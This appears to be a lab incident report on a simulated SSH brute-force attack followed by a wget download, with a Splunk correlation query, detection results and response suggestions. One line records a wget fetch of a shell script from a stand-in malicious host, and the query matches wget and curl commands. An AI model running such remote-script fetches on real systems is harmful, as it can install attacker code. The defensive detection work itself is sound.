==============================
🔐 INCIDENT REPORT – SSH Brute Force + wget Activity
==============================

📅 Date: June 4, 2025  
📍 Host: siem-server  
👤 User: testuser  

---

🧪 Simulated Activity:

1. 5x Failed SSH login attempts (brute-force)
2. 1x Successful SSH login
3. wget command: http://malicious-site.com/bad.sh (post-auth action)

---

📝 Logs Involved:
- /var/log/auth.log (SSH authentication)
- /home/testuser/.bash_history (command execution)

---

🔍 Detection Logic:

(index=* sourcetype=linux_secure "Failed password" OR "Accepted password")
OR (index=* sourcetype=bash_history "wget" OR "curl")
| transaction user maxspan=10m
| search eventcount>=6

✅ Detection Outcome:

Brute-force behavior was confirmed

Suspicious post-login download observed

Successfully correlated in Splunk across logs

🛡 Suggested Response:

Monitor bash_history across critical users

Set alert on 5+ failed logins + wget/curl command

Conduct system health review & potential IOC scan
